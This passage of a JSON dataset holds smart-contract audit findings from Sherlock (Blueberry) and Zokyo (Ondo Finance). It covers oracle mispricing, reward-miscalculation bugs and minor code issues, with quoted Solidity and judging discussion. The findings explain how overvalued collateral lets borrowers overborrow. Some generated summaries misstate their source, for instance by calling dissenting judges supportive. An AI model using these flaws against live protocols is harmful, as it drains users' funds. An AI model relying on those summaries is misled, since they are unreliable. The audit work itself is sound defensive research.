      "summary": "\nThis bug report is about the wrong bToken exchange rate being used by the BlueBerryBank.sol contract to calculate the collateral value of a position. The issue was found by mert_eren and the code snippet is available at the given link. The issue is that the getIsolatedCollateralValue() function is using the debtToken's exchange rate instead of the underlyingToken's exchange rate, which can lead to a mis-calculation of the collateral value and thus the position risk. This is due to the fact that when the underlyingVaultShare is stored in the lend() function, it is not stored directly as the amount lent, but as the amount minted in the softVault after the token has been lent to it. This amount must be multiplied with the bToken of the underlyingToken's exchangeRateStored in order to calculate the underlyingAmount correctly. \n\nThe impact of this issue is that it can lead to a mis-calculation of the collateral value and thus the position risk. The recommendation to fix this issue is to use the underlying token's bToken exchangeRate in the getIsolatedCollateralValue() function instead of the debtToken's. After further discussion, it was decided that this is a valid high issue and not a duplicate of #16.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/117",
      "tags": [
        "Wrong Math"
      ],
      "finders": [
        "mert\\_eren"
      ]
    },
    {
      "id": "24319",
      "title": "H-4: CVX/AURA distribution calculation is incorrect and will lead to loss of rewards at the end of each cliff",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/109 \n\n## Found by \n0x52\n\nWhen calculating the amount of pending AURA owed to a user _getAuraPendingReward uses the current values for supply. This leads to incorrect calculation across cliffs which leads to loss of rewards for users.\n\n## Vulnerability Detail\n\n[WAuraPools.sol#L233-L248](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/wrapper/WAuraPools.sol#L233-L248)\n\n        if (cliff < totalCliffs) {\n            /// e.g. (new) reduction = (500 - 100) * 2.5 + 700 = 1700;\n            /// e.g. (new) reduction = (500 - 250) * 2.5 + 700 = 1325;\n            /// e.g. (new) reduction = (500 - 400) * 2.5 + 700 = 950;\n            uint256 reduction = ((totalCliffs - cliff) * 5) / 2 + 700;\n            /// e.g. (new) amount = 1e19 * 1700 / 500 =  34e18;\n            /// e.g. (new) amount = 1e19 * 1325 / 500 =  26.5e18;\n            /// e.g. (new) amount = 1e19 * 950 / 500  =  19e17;\n            mintAmount = (mintRequestAmount * reduction) / totalCliffs;\n\n            /// e.g. amtTillMax = 5e25 - 1e25 = 4e25\n            uint256 amtTillMax = emissionMaxSupply - emissionsMinted;\n            if (mintAmount > amtTillMax) {\n                mintAmount = amtTillMax;\n            }\n        }\n\nThe above code is used to calculate the amount of AURA owed to the user. This calculation is perfectly accurate if the AURA hasn't been minted yet. The problem is that each time a user withdraws, AURA is claimed for ALL vault participants. This means that the rewards will be realized for a majority of users before they themselves withdraw. Since the emissions decrease with each cliff, there will be loss of funds at the end of each cliff.\n\nExample:\nAssume for simplicity there are only 2 cliffs. User A deposits LP to WAuraPools. After some time User B deposits as well. Before the end of the first cliff User A withdraw. This claims all tokens owed to both users A and B which is now sitting in the contract. Assume both users are owed 10 tokens. Now User B waits for the second cliff to end before withdrawing. When calculating his rewards it will give him no rewards since all cliffs have ended. The issue is that the 10 tokens they are owed is already sitting in the contract waiting to be claimed.\n\n## Impact\n\nAll users will lose rewards at the end of each cliff due to miscalculation\n\n## Code Snippet\n\n[WAuraPools.sol#L209-L249](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/wrapper/WAuraPools.sol#L209-L249)\n\n[WConvexPools.sol#L149-L172](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/wrapper/WConvexPools.sol#L149-L172)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nI would recommend a hybrid approach. When rewards are claimed upon withdrawal, the reward per token should be cached to prevent loss of tokens that have already been received by the contract. Only unminted AURA should be handled this way.\n\n\n\n## Discussion\n\n**IAm0x52**\n\nEscalate\n\nThis was wrongly excluded and causes a significant problem. Whenever a position is burned it calls the following line:\n\nhttps://github.com/sherlock-audit/2023-07-blueberry/blob/7c7e1c4a8f3012d1afd2e598b656010bb9127836/blueberry-core/contracts/wrapper/WAuraPools.sol#L379\n\n        IAuraRewarder(auraRewarder).withdraw(amount, true);\n\nWhich withdraws the LP and claims rewards because of the `true` input. Digging into the rewarder contract:\n\nhttps://etherscan.io/address/0x1204f5060be8b716f5a62b4df4ce32acd01a69f5#code#F18#L229\n\n    function withdraw(uint256 amount, bool claim)\n        public\n        updateReward(msg.sender)\n        returns(bool)\n    {\n        require(amount > 0, 'RewardPool : Cannot withdraw 0');\n\n        //also withdraw from linked rewards\n        for(uint i=0; i < extraRewards.length; i++){\n            IRewards(extraRewards[i]).withdraw(msg.sender, amount);\n        }\n\n        _totalSupply = _totalSupply.sub(amount);\n        _balances[msg.sender] = _balances[msg.sender].sub(amount);\n\n        stakingToken.safeTransfer(msg.sender, amount);\n        emit Withdrawn(msg.sender, amount);\n     \n        if(claim){\n            getReward(msg.sender,true);\n        }\n\n        emit Transfer(msg.sender, address(0), amount);\n\n        return true;\n    }\n\nHere we see that if claim == true then we call `getReward`\n\nhttps://etherscan.io/address/0x1204f5060be8b716f5a62b4df4ce32acd01a69f5#code#F18#L296\n\n    function getReward(address _account, bool _claimExtras) public updateReward(_account) returns(bool){\n        uint256 reward = earned(_account);\n        if (reward > 0) {\n            rewards[_account] = 0;\n            rewardToken.safeTransfer(_account, reward);\n            IDeposit(operator).rewardClaimed(pid, _account, reward);\n            emit RewardPaid(_account, reward);\n        }\n\n        //also get rewards from linked rewards\n        if(_claimExtras){\n            for(uint i=0; i < extraRewards.length; i++){\n                IRewards(extraRewards[i]).getReward(_account);\n            }\n        }\n        return true;\n    }\n\nHere we see that the ENTIRE reward balance is claimed for the vault. This presents the problem as outlined in my issue above. Let's assume that the reward for the current round is 1:1 (i.e. that each claimed BAL gives 1 AURA). Assume we have 2 users, each with half the pool. Now 100 tokens are claimed in this round, which means each user is owed 50 AURA. After some amount of rounds, the reward is now 1:0.5 (i.e. that each claimed BAL gives 1 AURA). Now when user A withdraws instead of being paid 100 AURA for that round they will instead only be paid 50 AURA and they will lose the other 50 since it won't be claimable. This is because it always uses the most recent exchange rate instead of the rate at which it was claimed.\n\n\n\n**sherlock-admin2**\n\n > Escalate\n> \n> This was wrongly excluded and causes a significant problem. Whenever a position is burned it calls the following line:\n> \n> https://github.com/sherlock-audit/2023-07-blueberry/blob/7c7e1c4a8f3012d1afd2e598b656010bb9127836/blueberry-core/contracts/wrapper/WAuraPools.sol#L379\n> \n>         IAuraRewarder(auraRewarder).withdraw(amount, true);\n> \n> Which withdraws the LP and claims rewards because of the `true` input. Digging into the rewarder contract:\n> \n> https://etherscan.io/address/0x1204f5060be8b716f5a62b4df4ce32acd01a69f5#code#F18#L229\n> \n>     function withdraw(uint256 amount, bool claim)\n>         public\n>         updateReward(msg.sender)\n>         returns(bool)\n>     {\n>         require(amount > 0, 'RewardPool : Cannot withdraw 0');\n> \n>         //also withdraw from linked rewards\n>         for(uint i=0; i < extraRewards.length; i++){\n>             IRewards(extraRewards[i]).withdraw(msg.sender, amount);\n>         }\n> \n>         _totalSupply = _totalSupply.sub(amount);\n>         _balances[msg.sender] = _balances[msg.sender].sub(amount);\n> \n>         stakingToken.safeTransfer(msg.sender, amount);\n>         emit Withdrawn(msg.sender, amount);\n>      \n>         if(claim){\n>             getReward(msg.sender,true);\n>         }\n> \n>         emit Transfer(msg.sender, address(0), amount);\n> \n>         return true;\n>     }\n> \n> Here we see that if claim == true then we call `getReward`\n> \n> https://etherscan.io/address/0x1204f5060be8b716f5a62b4df4ce32acd01a69f5#code#F18#L296\n> \n>     function getReward(address _account, bool _claimExtras) public updateReward(_account) returns(bool){\n>         uint256 reward = earned(_account);\n>         if (reward > 0) {\n>             rewards[_account] = 0;\n>             rewardToken.safeTransfer(_account, reward);\n>             IDeposit(operator).rewardClaimed(pid, _account, reward);\n>             emit RewardPaid(_account, reward);\n>         }\n> \n>         //also get rewards from linked rewards\n>         if(_claimExtras){\n>             for(uint i=0; i < extraRewards.length; i++){\n>                 IRewards(extraRewards[i]).getReward(_account);\n>             }\n>         }\n>         return true;\n>     }\n> \n> Here we see that the ENTIRE reward balance is claimed for the vault. This presents the problem as outlined in my issue above. Let's assume that the reward for the current round is 1:1 (i.e. that each claimed BAL gives 1 AURA). Assume we have 2 users, each with half the pool. Now 100 tokens are claimed in this round, which means each user is owed 50 AURA. After some amount of rounds, the reward is now 1:0.5 (i.e. that each claimed BAL gives 1 AURA). Now when user A withdraws instead of being paid 100 AURA for that round they will instead only be paid 50 AURA and they will lose the other 50 since it won't be claimable. This is because it always uses the most recent exchange rate instead of the rate at which it was claimed.\n> \n> \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Shogoki**\n\n@Gornutz What do you think about it? \nI think it is a valid Medium.\n\n**Gornutz**\n\nSeems directionally correct and valid from the parts of the POC provided. \n\n**IAm0x52**\n\nThe current AURA APR for pools are high double digit to triple digit returns. Additionally AURA is distributed over [~8 years](https://docs.aura.finance/aura/usdaura/distribution) and there are [500 cliffs](https://etherscan.io/address/0xC0c293ce456fF0ED870ADd98a0828Dd4d2903DBF#code#F1#L25) over that period. This makes the average cliff ~6 days. Unless every single user withdraws and redeposits each 6 day period (which is prohibitively expensive due to gas costs) this loss cannot be avoided. Given the almost certainty of the loss and the substantial amount these users stand to lose due to the high APRs and leveraged nature of the system, I believe this should be high risk rather than medium.\n\n**hrishibhat**\n\nResult:\nHigh\nUnique \nAfter further review considering this to be a high based on the comments above \n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [IAm0x52](https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/109/#issuecomment-1694743790): accepted",
      "summary": "\nA bug was found in the CVX/AURA distribution calculation which could lead to users losing rewards at the end of each cliff. The bug is caused by the code in the WAuraPools.sol and WConvexPools.sol contracts which calculates the amount of AURA owed to the user. This calculation is accurate if the AURA hasn't been minted yet, however when a user withdraws, AURA is claimed for all vault participants and this leads to a loss of rewards at the end of each cliff. \n\nThe bug was found by 0x52, who used manual review as a tool to identify the issue. The code snippet of the bug can be found in the WAuraPools.sol#L209-L249 and WConvexPools.sol#L149-L172. \n\nThe impact of the bug is that all users will lose rewards at the end of each cliff due to miscalculation. To prevent this from happening, 0x52 recommended a hybrid approach. When rewards are claimed upon withdrawal, the reward per token should be cached to prevent loss of tokens that have already been received by the contract. Only unminted AURA should be handled this way. \n\nThe bug was discussed by 0x52, sherlock-admin2, Shogoki, Gornutz and hrishibhat. After further review, it was determined that the bug should be classified as high risk.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/109",
      "tags": [
        "Wrong Math"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "24318",
      "title": "H-3: CurveTricryptoOracle#getPrice contains math error that causes LP to be priced completely wrong",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/100 \n\n## Found by \n0x52, Kow\n\nCurveTricryptoOracle#getPrice incorrectly divides the LP price by the price of ETH which causes it to return the price of LP in terms of ETH instead of USD\n\n## Vulnerability Detail\n\n[CurveTricryptoOracle.sol#L57-L62](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/oracle/CurveTricryptoOracle.sol#L57-L62)\n\n                (lpPrice(\n                    virtualPrice,\n                    base.getPrice(tokens[1]),\n                    ethPrice,\n                    base.getPrice(tokens[0])\n                ) * 1e18) / ethPrice;\n\nAfter the LP price has been calculated in USD it is mistakenly divided by the price of ETH causing the contract to return the LP price in terms of ETH rather than USD. This leads to LP that is massively undervalued causing positions which are actually heavily over collateralized to be liquidated.\n\n## Impact\n\nHealthy positions are liquidated due to incorrect LP pricing\n\n## Code Snippet\n\n[CurveTricryptoOracle.sol#L48-L65](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/oracle/CurveTricryptoOracle.sol#L48-L65)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nDon't divide the price by the price of ETH\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**0xyPhilic** commented:\n> invalid because lpPrice is considered in ETH so dividing by ETH/USD price returns the final result in USD\n\n**Kral01** commented:\n> there is a precision value\n\n\n\n**Gornutz**\n\nJudges accurately state why the division by ETH/USD is required to return the proper USD value.\n\n**Shogoki**\n\nClosing in regards to other judges and sponsors comments.\n\n**IAm0x52**\n\nThis is valid. The code being used here was borrowed from the Sentiment [CurveTriCryptoOracle](https://arbiscan.io/address/0x4e828a117ddc3e4dd919b46c90d4e04678a05504#code), which is specifically meant to return the price in terms of ETH. This oracle is meant to return the valuation in USD which means the division by the price of ETH needs to be dropped.\n\n**Shogoki**\n\n> This is valid. The code being used here was borrowed from the Sentiment [CurveTriCryptoOracle](https://arbiscan.io/address/0x4e828a117ddc3e4dd919b46c90d4e04678a05504#code), which is specifically meant to return the price in terms of ETH. This oracle is meant to return the valuation in USD which means the division by the price of ETH needs to be dropped.\n\nMaybe was a bit quick in closing. Will reopen it and we will take a deeper look at it.",
      "summary": "\nThis bug report is about an issue found in the CurveTricryptoOracle#getPrice function of the codebase. The bug causes the Liquidation Price (LP) to be priced completely wrong due to a math error. The code snippet in question is located at CurveTricryptoOracle.sol#L57-L62 and it incorrectly divides the LP price by the price of ETH which causes it to return the price of LP in terms of ETH instead of USD. This leads to healthy positions being liquidated due to incorrect LP pricing. \n\nThe issue was initially found by 0x52 and Kow and then discussed by other members of the Sherlock Audit team. The team concluded that the code was borrowed from the Sentiment CurveTriCryptoOracle which is meant to return the price in terms of ETH. As the oracle is meant to return the valuation in USD, the division by the price of ETH needs to be dropped. The issue was then reopened for further investigation.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/100",
      "tags": [
        "Wrong Math",
        "Oracle",
        "Decimals"
      ],
      "finders": [
        "Kow",
        "0x52"
      ]
    },
    {
      "id": "24317",
      "title": "H-2: CurveTricryptoOracle incorrectly assumes that WETH is always the last token in the pool which leads to bad LP pricing",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/98 \n\n## Found by \n0x52, Vagner\n\nCurveTricryptoOracle assumes that WETH is always the last token in the pool (`tokens[2]`). This is incorrect for a majority of tricrypto pools and will lead to LP being highly overvalued.\n\n## Vulnerability Detail\n\n[CurveTricryptoOracle.sol#L53-L63](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/oracle/CurveTricryptoOracle.sol#L53-L63)\n\n        if (tokens.length == 3) {\n            /// tokens[2] is WETH\n            uint256 ethPrice = base.getPrice(tokens[2]);\n            return\n                (lpPrice(\n                    virtualPrice,\n                    base.getPrice(tokens[1]),\n                    ethPrice,\n                    base.getPrice(tokens[0])\n                ) * 1e18) / ethPrice;\n        }\n\nWhen calculating LP prices, CurveTricryptoOracle#getPrice always assumes that WETH is the second token in the pool. This isn't the case which will cause the LP to be massively overvalued.\n\nThere are 6 tricrypto pools currently deployed on mainnet. Half of these pools have an asset other than WETH as token[2]:\n\n        0x4ebdf703948ddcea3b11f675b4d1fba9d2414a14 - CRV\n        0x5426178799ee0a0181a89b4f57efddfab49941ec - INV\n        0x2889302a794da87fbf1d6db415c1492194663d13 - wstETH\n\n## Impact\n\nLP will be massively overvalued leading to overborrowing and protocol insolvency\n\n## Code Snippet\n\n[CurveTricryptoOracle.sol#L48-L65](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/oracle/CurveTricryptoOracle.sol#L48-L65)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThere is no need to assume that WETH is the last token. Simply pull the price for each asset and input it into lpPrice.\n\n\n\n\n\n## Discussion\n\n**IAm0x52**\n\nEscalate\n\nThis is not a dupe of #105. This will cause a large number of tricrypto pools to be overvalued which presents a serious risk to the protocol.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> This is not a dupe of #105. This will cause a large number of tricrypto pools to be overvalued which presents a serious risk to the protocol.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Shogoki**\n\nAgree. \nThis is not a duplicate of #105 \nThis can become its own main report and #20 is a duplicate of it.\n\nThere were some issues with (de)duplication. I would resolve like this.\n#98 is the duplicate with #20 \n#105 is duplicate with #42 \n\n**hrishibhat**\n\nResult:\nHigh \nHas duplicates\nThis is a valid high issue based on the description\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [IAm0x52](https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/98/#issuecomment-1694746548): accepted",
      "summary": "\nA bug report has been identified in the CurveTricryptoOracle.sol code which incorrectly assumes that WETH is always the last token in the pool. This issue was found by 0x52 and Vagner and can lead to LP being highly overvalued. The code snippet from the CurveTricryptoOracle.sol file which is causing the issue is located at line 53-63. This issue can cause LP to be massively overvalued, leading to overborrowing and protocol insolvency. A manual review was used to identify this bug. \n\nThe recommended resolution to this issue is to not assume that WETH is the last token in the pool and instead pull the price for each asset and input it into lpPrice. The bug report was escalated by 0x52, who noted that this issue could cause a large number of tricrypto pools to be overvalued, which presents a serious risk to the protocol. Shogoki agreed with the escalation and noted that #98 was the duplicate with #20 and #105 was duplicate with #42. Hrishibhat concluded that this is a valid high issue. Finally, the escalations were successfully resolved.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/98",
      "tags": [
        "Oracle",
        "Configuration",
        "Business Logic"
      ],
      "finders": [
        "Vagner",
        "0x52"
      ]
    },
    {
      "id": "24316",
      "title": "H-1: Stable BPT valuation is incorrect and can be exploited to cause protocol insolvency",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/97 \n\n## Found by \n0x52\n\nThe current methodology for valuing Stable BPT is incorrect and can lead to significant over valuation of the stable BPT.\n\n## Vulnerability Detail\n\n[StableBPTOracle.sol#L48-L53](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/oracle/StableBPTOracle.sol#L48-L53)\n\n        uint256 minPrice = base.getPrice(tokens[0]);\n        for(uint256 i = 1; i != length; ++i) {\n            uint256 price = base.getPrice(tokens[i]);\n            minPrice = (price < minPrice) ? price : minPrice;\n        }\n        return minPrice.mulWadDown(pool.getRate());\n\nThe above block is used to calculate the price. Finding the min price of all assets in the pool then multiplying by the current rate of the pool. This is nearly identical to how stable curve LP is priced. Balancer pools are a bit different and this methodology is incorrect for them. Lets look at a current mainnet pool to see the problem. Take the wstETH/aETHc pool. Currently getRate() = 1.006. The lowest price is aETHc at 2,073.23. This values the LP at 2,085.66. The issue is that the LPs actual value is 1,870.67 (nearly 12% overvalued) which can be checked [here](https://app.apy.vision/pools/balancerv2_eth-wstETH-ankrETH-0xdfe6e7e18f6cc65fa13c8d8966013d4fda74b6ba).\n\nOvervaluing the LP as such can cause protocol insolvency as the borrower can overborrow against the LP, leaving the protocol with bad debt.\n\n## Impact\n\nProtocol insolvency due to overborrowing\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/oracle/StableBPTOracle.sol#L37-L54\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nStable BPT oracles need to use a new pricing methodology\n\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**0xyPhilic** commented:\n> invalid because there is no sufficient data/explanations to support the explained issue\n\n**Kral01** commented:\n> only an issue if the protocol uses this LP pair\n\n\n\n**IAm0x52**\n\nEscalate\n\nThis is not a dupe of #100. Though it focuses on a similar area of the code, the underlying issue is completely different. StableBPT is value highly incorrectly for some pools and it will cause significant damage to the protocol.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> This is not a dupe of #100. Though it focuses on a similar area of the code, the underlying issue is completely different. StableBPT is value highly incorrectly for some pools and it will cause significant damage to the protocol.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Shogoki**\n\n> ing the LP as such can cause protocol insolvency as the borrower can overborrow against the LP, leaving the protocol with bad debt.\n\nYes, not a duplicate of #100 \n@Gornutz can you take a look at this?\n\n**Gornutz**\n\nConfirm this is not a duplicate of #100  \n\n**hrishibhat**\n\nResult:\nHigh \nUnique\nConsidering this a valid high issue as the wrong price is calculated and returned\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [IAm0x52](https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/97/#issuecomment-1694746948): accepted",
      "summary": "\nThis bug report is about an issue with the Stable BPT valuation methodology, which can lead to significant overvaluation of the stable BPT. This can cause protocol insolvency as the borrower can overborrow against the LP, leaving the protocol with bad debt. The issue was found by 0x52 and was confirmed by Gornutz and Hrishibhat. The code snippet that was identified to be the cause of the issue was located at StableBPTOracle.sol#L48-L53. The issue was discussed by 0xPhilic and Kral01, who both concluded that the issue was valid and unique. The issue was then escalated by IAm0x52 and Shogoki, and the escalation was accepted by sherlock-admin2. The issue is considered a valid high issue as the wrong price is calculated and returned, leading to potential protocol insolvency.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/97",
      "tags": [
        "Wrong Math",
        "Oracle"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "44766",
      "title": "SPDX license not specified",
      "impact": "LOW",
      "content": "**Severity**: Informational\n\n**Status**: Resolved\n\n**Description**\n\nThe ommf.sol contract doesn't contain the SPDX license header\n\n**Recommendation**: \n\nadd the SPDX license to ommf.sol",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Zokyo",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Zokyo/2023-06-14-Ondo Finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zokyo"
      ]
    },
    {
      "id": "44765",
      "title": "`decimalsMultiplier` should be immutable",
      "impact": "LOW",
      "content": "**Severity**: Informational\n\n**Status**: Resolved\n\n**Description**\n\nIn the contract RWAHub.sol on the line 66 there is a state variable which value is assigned during in the constructor and not defined elsewhere in the code.\n\n**Recommendation**:\n\nadd the `immutable` attribute to state variables that never change or are set only in the constructor",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Zokyo",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Zokyo/2023-06-14-Ondo Finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zokyo"
      ]
    },
    {
      "id": "44764",
      "title": "`collateral` should be immutable",
      "impact": "LOW",
      "content": "**Severity**: Informational\n\n**Status**: Resolved\n\n**Description**\n\nIn the contract RWAHub.sol on the line 25 there is a state variable which value is assigned during in the constructor and not defined elsewhere in the code.\n\n**Recommendation**: \n\nadd the `immutable` attribute to state variables that never change or are set only in the constructor",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Zokyo",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Zokyo/2023-06-14-Ondo Finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zokyo"
      ]
    },
    {
      "id": "44763",
      "title": "`rwaOracle` should be immutable",
      "impact": "LOW",
      "content": "**Severity**: Informational\n\n**Status**: Resolved\n\n**Description**\n\nIn the contract Pricer.sol on the line 45 there is a state variable which value is assigned during in the constructor and not defined elsewhere in the code.\n\n**Recommendation**: \n\nadd the `immutable` attribute to state variables that never change or are set only in the constructor",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Zokyo",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Zokyo/2023-06-14-Ondo Finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zokyo"
      ]
    },
    {
      "id": "44762",
      "title": "`wommf` should be immutable",
      "impact": "LOW",
      "content": "**Severity**: Informational\n\n**Status**: Resolved\n\n**Description**\n\nIn the contract ommfManager.sol on the line 25 there is a state variable which value is assigned during in the constructor and not defined elsewhere in the code.\n\n**Recommendation**: \n\nadd the `immutable` attribute to state variables that never change or are set only in the constructor",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Zokyo",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Zokyo/2023-06-14-Ondo Finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zokyo"
      ]
    },
    {
      "id": "44761",
      "title": "Unused function parameter",
      "impact": "LOW",
      "content": "**Severity**: Informational\n\n**Status**: Resolved\n\n**Description**\n\nIn the contract ommf.sol on the line 588 there is declared a variable which is not used in the code.\n\n**Recommendation**: \n\nuse \"_\" instead of the named argument",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Zokyo",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Zokyo/2023-06-14-Ondo Finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zokyo"
      ]
    },
    {
      "id": "44760",
      "title": "Instant redemption is paused",
      "impact": "LOW",
      "content": "**Severity**: Low\n\n**Status**: Acknowledged\n\n**Description**\n\nAt the contract deployment the claimExcess function of the RWAHubInstantMints is paused by default which may lead to an excess call to `unpause` function before it actually starts working\n\n**Recommendation**: \n\ninitialize the instantRedemptionPaused with the false if claims need to be ready right after deployment",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Zokyo",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Zokyo/2023-06-14-Ondo Finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zokyo"
      ]
    },
    {
      "id": "44759",
      "title": "Claim excess is paused",
      "impact": "LOW",
      "content": "**Severity**: Low\n\n**Status**: Acknowledged\n\n**Description**\n\nAt the contract deployment the claimExcess function of the RWAHubInstantMints is paused by default which may lead to an excess call to `unpause` function before it actually starts working\n\n**Recommendation**: \n\ninitialize the instantRedemptionPaused with the false if claims need to be ready right after deployment\nâ€‹",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Zokyo",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Zokyo/2023-06-14-Ondo Finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zokyo"
      ]
    },
    {
      "id": "44758",
      "title": "Initial mints are paused",
      "impact": "LOW",
      "content": "**Severity**: Low\n\n**Status**: Acknowledged\n\n**Description**\n\nAt the contract deployment the claimExcess function of the RWAHubNonStableInstantMints is paused by default which may lead to an excess call to `unpause` function before it actually starts working\n\n**Recommendation**: \n\ninialize the claimExcessPaused with false if claims need to be ready right after deployment",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Zokyo",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Zokyo/2023-06-14-Ondo Finance.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zokyo"
      ]
    },
    {
      "id": "44757",
      "title": "Incorrect variable used to compare",
      "impact": "MEDIUM",
      "content": "**Severity**: Medium\n\n**Status**: Resolved\n\n**Description**\n\nIn the contract RWAHubOffChainRedemptions the function requestRedemptionServicedOffchain is using the `minimumRedemptionAmount` to compare the `amountRWATokenToRedeem` with while the `minimumOffChainRedemptionAmount` is unused\n\n**Recommendation**: \n\nmake sure `minimumOffChainRedemptionAmount` is needed\nAt the contract deployment the initial mints of the RWAHubNonStableInstantMints and RWAHubInstantMints are paused by default which may lead to excess call to `unpause` function before it actually starts working\n\ninialize the instantMintPaused with false if mints need to be ready right after deployment",
      "summary": "\nThe report is about a medium severity bug that has been resolved. The bug is related to a contract called RWAHubOffChainRedemptions, specifically in the function called requestRedemptionServicedOffchain. The bug is caused by the fact that the `minimumOffChainRedemptionAmount` is not being used, while the `minimumRedemptionAmount` is being used for comparison. The recommendation is to make sure that the `minimumOffChainRedemptionAmount` is needed. Additionally, there is a problem with the initial deployment of two other contracts, RWAHubNonStableInstantMints and RWAHubInstantMints, as they are paused by default. This may result in multiple calls to the `unpause` function before it is actually ready to work. The recommendation is to initialize the `instantMintPaused` variable with false if the mints need to be ready immediately after deployment. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Zokyo",
      "protocol_name": "Ondo Finance",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Zokyo/2023-06-14-Ondo Finance.md",
      "github_link": "",
